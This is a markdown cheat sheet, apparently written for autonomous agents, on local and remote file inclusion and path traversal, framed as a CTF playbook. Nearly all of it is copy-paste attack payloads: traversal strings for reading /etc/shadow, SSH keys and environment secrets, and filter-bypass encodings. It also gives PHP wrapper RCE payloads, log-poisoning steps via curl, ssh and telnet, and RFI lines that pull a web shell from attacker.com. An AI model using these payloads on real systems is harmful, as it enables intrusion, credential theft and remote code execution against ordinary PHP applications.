# Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal

> **Document Purpose:** Actionable file inclusion and path traversal techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, filter bypasses, and escalation paths.

---

## 1. QUICK REFERENCE: Detection Payloads

> **When to use this section:** You suspect a file parameter can be manipulated to read arbitrary files.

### 1.1 Path Traversal Detection Probes

**Tags:** `lfi, path-traversal, detection, probe, testing, directory-traversal`

**Primary Detection Payloads (Try First):**
```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Quick Test Sequence:**
```
1. ?file=../etc/passwd
2. ?file=../../etc/passwd
3. ?file=../../../etc/passwd
4. ?file=../../../../etc/passwd
5. ?file=../../../../../etc/passwd
```

**Success Indicators:**
- Content of /etc/passwd displayed (Linux)
- Windows hosts file content displayed
- Error message shows file path
- Different response length or content

**Common Vulnerable Parameters:**
```
?file=
?path=
?page=
?template=
?include=
?doc=
?document=
?folder=
?root=
?filename=
?filepath=
?data=
?view=
?content=
?lang=
```

**Agent Takeaway:**
- Start with `../../../etc/passwd` on Linux targets
- Increase `../` count until you reach root or hit limit
- Test every file-related parameter

---

### 1.2 LFI vs Path Traversal vs RFI

**Tags:** `lfi, rfi, path-traversal, definitions, comparison`

**Definitions:**

| Type | Description | Example |
|------|-------------|---------|
| Path Traversal | Navigate directories using `../` | `?file=../../../etc/passwd` |
| LFI | Include local file in application context | `?page=../../../etc/passwd` (file executed/displayed) |
| RFI | Include remote file from attacker's server | `?page=http://evil.com/shell.php` |

**Key Differences:**
- **Path Traversal**: Just reads files
- **LFI**: File may be interpreted/executed (e.g., PHP files)
- **RFI**: Can include files from external URLs (rare, requires config)

**Agent Takeaway:**
- Path Traversal = read files
- LFI = read + potentially execute local files
- RFI = execute remote files (check `allow_url_include` on PHP)

---

## 2. PATH TRAVERSAL EXPLOITATION

> **When to use this section:** You can navigate directories to read arbitrary files.

### 2.1 Basic Path Traversal Payloads

**Tags:** `path-traversal, basic, payloads, directory-traversal`

**Linux Targets:**
```
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../home/user/.bash_history
../../../home/user/.ssh/id_rsa
../../../proc/self/environ
../../../proc/self/cmdline
../../../var/log/apache2/access.log
../../../var/log/auth.log
```

**Windows Targets:**
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\system.ini
..\..\..\windows\win.ini
..\..\..\windows\system32\config\SAM
..\..\..\inetpub\wwwroot\web.config
..\..\..\inetpub\logs\logfiles
```

**Application-Specific Files:**
```
../../../var/www/html/config.php
../../../var/www/html/.htaccess
../../../var/www/html/wp-config.php
../../../opt/app/config/database.yml
../../../app/config/parameters.yml
```

**Agent Takeaway:**
- `/etc/passwd` is the go-to test file (always readable)
- Look for config files, SSH keys, and logs
- CTF flags often in `/flag`, `/flag.txt`, or app directories

---

### 2.2 Finding the Flag via Path Traversal

**Tags:** `path-traversal, ctf, flag, discovery`

**Common Flag Locations:**
```
../../../flag
../../../flag.txt
../../../home/user/flag.txt
../../../root/flag.txt
../../../var/www/html/flag.txt
../../../opt/flag.txt
../../../app/flag.txt
../../../secret/flag.txt
```

**Reading Source Code:**
```
../../../var/www/html/index.php
../../../var/www/html/app.py
../../../app/main.py
../../../src/app.js
```

**Environment Variables:**
```
../../../proc/self/environ
../../../proc/1/environ
```

**Agent Takeaway:**
- Try `/flag`, `/flag.txt` first
- Read application source for hardcoded secrets
- Check `/proc/self/environ` for environment variables

---

## 3. FILTER BYPASS TECHNIQUES

> **When to use this section:** Basic path traversal payloads are being blocked.

### 3.1 Encoding Bypasses

**Tags:** `lfi, path-traversal, bypass, encoding, url-encode`

**URL Encoding:**
```
%2e%2e%2f = ../
%2e%2e/ = ../
..%2f = ../
%2e%2e%5c = ..\
```

**Double URL Encoding:**
```
%252e%252e%252f = ../
%252e%252e/ = ../
..%252f = ../
```

**16-bit Unicode Encoding:**
```
%u002e%u002e%u002f = ../
..%u002f = ../
```

**UTF-8 Encoding:**
```
%c0%ae%c0%ae%c0%af = ../
%c0%ae%c0%ae/ = ../
```

**Agent Takeaway:**
- Try URL encoding (`%2e%2e%2f`) when `../` blocked
- Double encoding for double-decode situations
- UTF-8 overlong encoding for legacy systems

---

### 3.2 Path Normalization Bypasses

**Tags:** `lfi, path-traversal, bypass, normalization, filter`

**Dot-Dot Variations:**
```
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd
..;/..;/..;/etc/passwd
..\/..\/..\/ (mixed slashes)
```

**Absolute Path with Traversal:**
```
/var/www/html/../../../etc/passwd
/etc/passwd (if no path check)
```

**Null Byte (PHP < 5.3.4):**
```
../../../etc/passwd%00
../../../etc/passwd%00.png
../../../etc/passwd\x00
```

**Truncation (Very Long Path):**
```
../../../etc/passwd/./././././././././.(repeat many times)
```

**Using Current Directory:**
```
./....//....//....//etc/passwd
/var/www/html/./../../etc/passwd
```

**Agent Takeaway:**
- `....//` bypasses simple `../` replacement
- Null byte can truncate file extensions (old PHP)
- Absolute paths may bypass relative-only checks

---

### 3.3 Extension Bypass

**Tags:** `lfi, path-traversal, bypass, extension, suffix`

**Problem:** Application appends extension like `.php`
**Query:** `?page=../../../../etc/passwd` → becomes `../../../../etc/passwd.php`

**Null Byte Bypass (PHP < 5.3.4):**
```
?page=../../../../etc/passwd%00
?page=../../../../etc/passwd\x00
```

**Path Truncation (PHP < 5.3):**
```
?page=../../../../etc/passwd/./././././(repeat to ~4096 chars)
```

**Using Question Mark or Hash:**
```
?page=../../../../etc/passwd?
?page=../../../../etc/passwd#
```

**Double Extension:**
```
?page=../../../../etc/passwd.php/../../etc/passwd
```

**Agent Takeaway:**
- Null byte truncates appended extensions (legacy systems)
- Very long paths may truncate in some parsers
- These bypasses work on older PHP versions

---

### 3.4 Filter Bypass Decision Tree

**Tags:** `lfi, path-traversal, bypass, decision-tree, workflow`

```
START: Basic payload blocked

TEST 1: What's filtered?
├── ../ blocked → Try encoding or ....//
├── etc/passwd blocked → Try Windows paths or app files
├── Extension appended → Try null byte or truncation
└── All paths blocked → Try filter/wrapper methods

STEP 2: Encoding bypass
├── Try: %2e%2e%2f
├── Try: %252e%252e%252f (double)
└── Try: ....//

STEP 3: Path normalization
├── Try: ..;/..;/
├── Try: ....//....//
└── Try: /var/www/html/../../../

STEP 4: Extension bypass
├── Try: %00 (null byte)
├── Try: /./././ (truncation)
└── Try: # or ? (fragment/query)

STEP 5: Alternative reading
├── Try: PHP filters (Section 4)
├── Try: Wrapper methods
└── Try: Log poisoning (Section 5)
```

---

## 4. PHP WRAPPER TECHNIQUES (LFI to RCE)

> **When to use this section:** Target uses PHP and you want to read source code or achieve RCE.

### 4.1 PHP Filter Wrapper (Source Code Disclosure)

**Tags:** `lfi, php, filter, wrapper, source-code, base64`

**Read PHP Source Code:**
```
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
```

**Result:** Base64-encoded PHP source (decode to read)

**Alternative Filters:**
```
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=string.toupper/resource=index.php
```

**Reading Non-PHP Files:**
```
?file=php://filter/resource=../../../etc/passwd
?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

**Agent Takeaway:**
- `php://filter/convert.base64-encode/resource=FILE` reads source code
- Decode base64 output to see actual PHP code
- Works even when PHP files are normally executed

---

### 4.2 PHP Input Wrapper (RCE)

**Tags:** `lfi, php, input, wrapper, rce, post-data`

**Requirements:** `allow_url_include = On` in php.ini

**Basic RCE:**
```
POST /?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

**Command via GET:**
```
?file=php://input&cmd=id
POST body: <?php system($_GET['cmd']); ?>
```

**Agent Takeaway:**
- Requires `allow_url_include` (often disabled)
- Send PHP code in POST body
- Less common in modern setups

---

### 4.3 Data Wrapper (RCE)

**Tags:** `lfi, php, data, wrapper, rce, base64`

**Requirements:** `allow_url_include = On`

**Basic RCE:**
```
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**URL Encoded:**
```
?file=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
```

**With Command Parameter:**
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id
```

**Agent Takeaway:**
- More likely to work than `php://input`
- Base64 encode to avoid special char issues
- `PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` = `<?php system('id'); ?>`

---

### 4.4 Expect Wrapper (RCE)

**Tags:** `lfi, php, expect, wrapper, rce`

**Requirements:** PHP `expect` extension installed

**RCE:**
```
?file=expect://id
?file=expect://cat%20/etc/passwd
?file=expect://cat%20/flag.txt
```

**Agent Takeaway:**
- Very rare (expect extension usually not installed)
- Direct command execution if available
- Try it - quick to test

---

### 4.5 PHP Wrapper Quick Reference

**Tags:** `lfi, php, wrappers, reference, quick`

| Wrapper | Purpose | Requirements |
|---------|---------|--------------|
| `php://filter` | Read source code | None |
| `php://input` | Execute POST body | `allow_url_include` |
| `data://` | Execute inline code | `allow_url_include` |
| `expect://` | Execute commands | expect extension |
| `zip://` | Read from ZIP | Archive on server |
| `phar://` | Execute from PHAR | PHAR on server |

**Most Useful for CTFs:**
```
php://filter/convert.base64-encode/resource=FILE
data://text/plain;base64,BASE64_PHP_CODE
```

---

## 5. LOG POISONING (LFI to RCE)

> **When to use this section:** You can read log files and want to achieve RCE.

### 5.1 Apache/Nginx Access Log Poisoning

**Tags:** `lfi, log-poisoning, apache, nginx, rce`

**Step 1: Locate Log File**
```
../../../var/log/apache2/access.log
../../../var/log/apache/access.log
../../../var/log/httpd/access.log
../../../var/log/nginx/access.log
../../../var/log/nginx/error.log
../../../usr/local/apache/log/access.log
```

**Step 2: Poison the Log (via User-Agent)**
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

Or in browser:
```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3: Include the Poisoned Log**
```
?file=../../../var/log/apache2/access.log&cmd=id
```

**Alternative Poison Points:**
- Referer header
- Cookie values
- POST data (in some log configs)

**Agent Takeaway:**
- Find log file → Inject PHP in User-Agent → Include log
- Works when `php://` wrappers disabled
- Common in CTF challenges

---

### 5.2 SSH Log Poisoning

**Tags:** `lfi, log-poisoning, ssh, auth, rce`

**Requirements:** SSH available, can attempt login

**Step 1: Poison auth.log**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

**Step 2: Include the Log**
```
?file=../../../var/log/auth.log&cmd=id
```

**Log Locations:**
```
/var/log/auth.log
/var/log/secure
/var/log/sshd.log
```

**Agent Takeaway:**
- Put PHP in SSH username during failed login
- Include auth.log to execute
- Requires SSH access to target

---

### 5.3 Mail Log Poisoning

**Tags:** `lfi, log-poisoning, mail, smtp, rce`

**Step 1: Send Email with PHP Payload**
```bash
telnet target.com 25
MAIL FROM: <?php system($_GET['cmd']); ?>
```

**Step 2: Include Mail Log**
```
?file=../../../var/log/mail.log&cmd=id
?file=../../../var/mail/www-data&cmd=id
```

---

## 6. REMOTE FILE INCLUSION (RFI)

> **When to use this section:** Target allows including files from remote URLs.

### 6.1 RFI Detection

**Tags:** `rfi, detection, remote, include, testing`

**Requirements:** PHP `allow_url_include = On` (rare)

**Detection Payloads:**
```
?file=http://attacker.com/test.txt
?file=http://attacker.com/shell.php
?file=//attacker.com/test.txt
?file=\\attacker.com\test.txt
```

**Verification:**
- Check for request in attacker's access logs
- Use webhook/requestbin to confirm outbound request

**Agent Takeaway:**
- RFI is rare in modern applications
- Test with a server you control
- If works, include remote PHP shell

---

### 6.2 RFI Exploitation

**Tags:** `rfi, exploitation, shell, rce`

**Step 1: Host Malicious File**
```php
# shell.txt on attacker server
<?php system($_GET['cmd']); ?>
```

**Step 2: Include and Execute**
```
?file=http://attacker.com/shell.txt&cmd=id
?file=http://attacker.com/shell.txt?&cmd=id
```

**Note:** Use `.txt` extension on attacker server to prevent execution there.

**SMB/UNC Path (Windows):**
```
?file=\\attacker.com\share\shell.php
```

**Agent Takeaway:**
- Host PHP code on external server
- Include via `http://` or `//`
- Use `.txt` extension on your server

---

## 7. CTF-SPECIFIC LFI STRATEGIES

> **When to use this section:** Solving LFI/Path Traversal challenges in CTF.

### 7.1 LFI Challenge Playbook

**Tags:** `lfi, ctf, playbook, workflow, step-by-step`

**Step 1: Identify File Parameter**
```
Look for: ?file=, ?page=, ?path=, ?include=, ?template=
```

**Step 2: Test Basic Traversal**
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**Step 3: Read Flag**
```
?file=../../../flag.txt
?file=../../../flag
?file=../../../home/user/flag.txt
```

**Step 4: If Filtered, Try Wrappers**
```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=../../../flag.txt
```

**Step 5: Escalate to RCE (if needed)**
```
Try: Log poisoning, php://input, data://
```

**Agent Takeaway:**
- Test traversal → Read flag → Use wrappers if blocked
- PHP filter wrapper often reveals source code with secrets
- Log poisoning for RCE when wrappers fail

---

### 7.2 Common CTF File Locations

**Tags:** `lfi, ctf, files, locations, common`

**Flags:**
```
/flag
/flag.txt
/home/*/flag*
/root/flag*
/var/www/html/flag*
/opt/flag*
./flag.txt
```

**Config Files (May Contain Secrets):**
```
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
/app/config.py
/app/.env
```

**Linux System Files:**
```
/etc/passwd
/etc/shadow (if readable = big finding)
/proc/self/environ
/home/*/.ssh/id_rsa
```

---

## 8. SUMMARY: LFI/Path Traversal Quick Reference

**Detection:**
```
?file=../../../etc/passwd
```

**Bypass Filters:**
```
....//....//etc/passwd
%2e%2e%2fetc/passwd
..%252f..%252fetc/passwd
```

**PHP Source Disclosure:**
```
?file=php://filter/convert.base64-encode/resource=index.php
```

**RCE Methods:**
1. Log poisoning (User-Agent + include log)
2. `php://input` (POST PHP code)
3. `data://` (inline PHP code)

**Quick Flag Hunt:**
```
?file=../../../flag.txt
?file=../../../flag
?file=php://filter/convert.base64-encode/resource=../../../flag.txt
```
